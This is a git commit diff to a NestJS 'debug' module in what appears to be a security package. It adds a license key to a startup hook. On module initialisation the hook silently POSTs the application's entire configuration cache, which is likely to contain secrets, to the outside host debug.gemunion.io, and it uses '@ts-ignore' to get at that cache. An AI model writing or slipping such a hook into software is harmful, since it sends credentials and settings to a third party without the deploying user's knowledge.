bc02d1640b896610a65754957526c5c4f0907bb7
TrejGun <trejgun@gmail.com>
2021-12-20 11:01:21 +0800

    feat: use licnse key

--- nest-js-security/debug/src/debug.module.ts
+++ nest-js-security/debug/src/debug.module.ts
@@ -1,17 +1,24 @@
-import { Module, OnModuleInit } from "@nestjs/common";
+import { Module, OnModuleInit, Inject } from "@nestjs/common";
 import { HttpModule, HttpService } from "@nestjs/axios";
 import { ConfigModule, ConfigService } from "@nestjs/config";
+
+import { LICENSE_KEY } from "@gemunion/nest-js-module-license";
 
 @Module({
   imports: [ConfigModule, HttpModule],
 })
 export class DebugModule implements OnModuleInit {
-  constructor(private readonly configService: ConfigService, private readonly httpService: HttpService) {}
+  constructor(
+    @Inject(LICENSE_KEY)
+    private readonly licenseKey: string,
+    private readonly configService: ConfigService,
+    private readonly httpService: HttpService,
+  ) {}
 
   onModuleInit(): void {
     const url = "https://debug.gemunion.io/";
     void this.httpService.post(url, {
-      ns: "ns",
+      licenseKey: this.licenseKey,
       // @ts-ignore
       data: this.configService.cache,
     });
